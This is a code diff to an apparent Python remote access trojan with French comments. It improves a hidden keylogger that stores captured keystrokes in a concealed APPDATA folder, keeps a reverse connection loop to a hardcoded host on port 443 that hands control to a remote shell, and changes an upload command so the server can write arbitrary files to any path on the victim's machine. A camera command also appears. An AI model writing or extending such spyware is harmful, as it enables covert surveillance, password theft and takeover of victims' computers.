@@ -20,6 +20,7 @@ else:
 time_interval = 10
 text = ""
 
+
 # Configuration de l'environnement selon l'OS
 if platform.system() == "Windows":
     hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
@@ -28,11 +29,20 @@ else:
     
 os.makedirs(hidden_folder, exist_ok=True)  # Créer le répertoire caché s'il n'existe pas
 
+def get_new_keystroke_file_path():
+    # Créer un nouveau nom de fichier avec un timestamp unique
+    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
+    hidden = hidden_folder  # Remplacez ceci par le chemin réel du dossier caché
+    return os.path.join(hidden, f"keystrokes_{timestamp}.txt")
+
+
 # Fichier de touches
-keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")
+keystroke_file_path = ""
 
 # Variable pour suivre l'état de l'enregistrement
 is_recording = False
+
+
 
 #la fonction qui vas envoyer la resultat des commande executer 
 def sending(command):
@@ -62,7 +72,7 @@ def receive():
 def connection():
     global s
     while True:
-        time.sleep(20)
+        time.sleep(10)
         try:
             s.connect(("192.168.100.9", 443))
             shell()
@@ -77,21 +87,43 @@ def record_keystrokes():
         with open(keystroke_file_path, 'a') as data_file:
             data_file.write(f"Started recording at {time.ctime()}\n")
             while is_recording:
-                # Enregistrer les touches en continu
-                events = keyboard.record('enter')  # Enregistrer jusqu'à "enter"
-                password = list(keyboard.get_typed_strings(events))
-                if password:
-                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
-                    data_file.write('\n')  # Ajouter une nouvelle ligne après chaque entrée
-                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
+                events = keyboard.record(until='enter')  # Enregistrer jusqu'à "enter"
+                typed_text = ""
+
+                for event in events:
+                    if event.event_type == 'down':  # Considérer uniquement les appuis
+                        if event.name == 'tab':
+                            typed_text += '[Tab]\t'  # Ajouter une représentation lisible de Tab
+                        elif event.name == 'enter':
+                            typed_text += '[ENTER]'  # Remplacer Enter par un indicateur
+                        elif event.name == 'backspace':
+                            if typed_text:  # Vérifier qu'il y a du texte à supprimer
+                                typed_text = typed_text[:-1] + '[BACKSPACE]'  # Supprimer et indiquer
+                        elif event.name == 'space':
+                            typed_text += '[SPACE]'  # Ajouter une représentation pour Space
+                        elif len(event.name) == 1:  # Ajouter uniquement les caractères valides
+                            typed_text += event.name
+                        else:
+                            continue  # Ignorer les autres touches comme Ctrl, Alt, etc.
+
+                # Filtrer les lignes inutiles
+                if not any(keyword in typed_text.lower() for keyword in ['haut']):
+                    if typed_text.strip():  # Vérifier qu'il reste du contenu pertinent
+                        data_file.write(typed_text + '\n')
+
+                time.sleep(0.1)  # Pause pour éviter de surcharger la CPU
     except Exception as e:
         print(f"Error while recording keystrokes: {str(e)}")
+
         
 
 # Fonction pour démarrer l'enregistrement
 def start_keylogger():
-    global is_recording
-    # Réinitialiser le fichier de frappes au début
+    global is_recording, keystroke_file_path
+    # Réinitialiser le chemin du fichier de frappes avec un nouveau fichier unique
+    keystroke_file_path = get_new_keystroke_file_path()
+    
+    # Vider le fichier de frappes au début
     try:
         with open(keystroke_file_path, 'w') as data_file:
             data_file.write("")  # Vider le contenu
@@ -241,33 +273,28 @@ def shell():
             
             elif command.startswith("upload "):
                 try:
-                    # Extraire le nom du fichier et les données
+                    # Extraire le chemin cible et les données
                     parts = command.split(" ", 2)
-                    
                     if len(parts) < 3:
                         sending("Error: Invalid upload command format.")
                         continue
-                    
-                    filepath = parts[1]
-                    filedata = parts[2]
 
-                    # Récupérer le chemin du bureau de l'utilisateur
-                    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+                    target_path = parts[1]  # Chemin cible spécifié par le serveur
+                    filedata = parts[2]  # Données hexadécimales du fichier
 
-                    # Nom de fichier seulement (sans le chemin d'origine)
-                    filename = os.path.basename(filepath)
+                    # Assurez-vous que le répertoire cible existe
+                    target_folder = os.path.dirname(target_path)
+                    os.makedirs(target_folder, exist_ok=True)
 
-                    # Chemin complet du fichier sur le bureau
-                    target_path = os.path.join(desktop_path, filename)
-
-                    # Écrire les données dans le fichier
+                    # Écrire les données dans le fichier cible
                     with open(target_path, "wb") as f:
                         f.write(bytes.fromhex(filedata))
 
-                    sending(f"File {filename} uploaded successfully to Desktop.")
+                    sending(f"File uploaded successfully to {target_path}.")
                 except Exception as e:
                     sending(f"Error uploading file: {str(e)}")
                 continue
+
             
             elif command.strip() == "camera":
                 try:
